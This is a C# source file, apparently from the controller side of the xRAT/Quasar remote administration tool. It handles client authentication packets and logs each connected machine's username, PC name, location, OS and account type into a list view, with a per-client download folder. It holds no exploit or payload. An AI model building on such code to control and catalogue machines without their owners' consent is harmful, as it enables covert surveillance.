using System;
using System.IO;
using System.Net.NetworkInformation;
using System.Windows.Forms;
using xServer.Core.Data;
using xServer.Core.Helper;
using xServer.Core.Networking;
using xServer.Core.Packets.ClientPackets;
using xServer.Forms;

namespace xServer.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE CONNECTION. */
    public static partial class CommandHandler
    {
        public static void HandleGetAuthenticationResponse(Client client, GetAuthenticationResponse packet)
        {
            if (client.EndPoint.Address.ToString() == "255.255.255.255" || packet.Id.Length != 64)
                return;

            try
            {
                client.Value.Version = packet.Version;
                client.Value.OperatingSystem = packet.OperatingSystem;
                client.Value.AccountType = packet.AccountType;
                client.Value.Ping = Ping(client.EndPoint.Address.ToString());
                client.Value.Country = packet.Country;
                client.Value.CountryCode = packet.CountryCode;
                client.Value.Region = packet.Region;
                client.Value.City = packet.City;
                client.Value.Id = packet.Id;
                client.Value.Username = packet.Username;
                client.Value.PCName = packet.PCName;
                client.Value.Tag = packet.Tag;

                string userAtPc = string.Format("{0}@{1}", client.Value.Username, client.Value.PCName);

                client.Value.DownloadDirectory = (!FileHelper.CheckPathForIllegalChars(userAtPc)) ?
                    Path.Combine(Application.StartupPath, string.Format("Clients\\{0}_{1}\\", userAtPc, client.Value.Id.Substring(0, 7))) :
                    Path.Combine(Application.StartupPath, string.Format("Clients\\{0}_{1}\\", client.EndPoint.Address, client.Value.Id.Substring(0, 7)));

                FrmMain.Instance.ConServer.CountAllTimeConnectedClientById(client.Value.Id);

                string country = string.Format("{0} [{1}]", client.Value.Country, client.Value.CountryCode);

                // this " " leaves some space between the flag-icon and first item
                ListViewItem lvi = new ListViewItem(new string[]
                {
                    " " + client.EndPoint.Address, client.Value.Tag,
                    userAtPc, client.Value.Version, "Connected", "Active", country,
                    client.Value.OperatingSystem, client.Value.AccountType, client.Value.Ping
                })
                { Tag = client, ImageIndex = packet.ImageIndex };

                FrmMain.Instance.AddClientToListview(lvi);

                if (Settings.ShowPopup)
                    FrmMain.Instance.ShowPopup(client);

                client.Value.IsAuthenticated = true;
                if (Settings.ShowToolTip)
                    new Packets.ServerPackets.GetSystemInfo().Execute(client);
            }
            catch
            {
            }
        }

        private static string Ping(string host)
        {
            try
            {
                Ping pingClass = new Ping();
                PingReply pingReply = pingClass.Send(host);
                return pingReply.RoundtripTime.ToString() + "ms";
            }
            catch

            {
                return "Unknown";
            }
        }


        public static void HandleSetStatus(Client client, SetStatus packet)
        {
            FrmMain.Instance.SetStatusByClient(client, packet.Message);
        }

        public static void HandleSetUserStatus(Client client, SetUserStatus packet)
        {
            FrmMain.Instance.SetUserStatusByClient(client, packet.Message);
        }
    }
}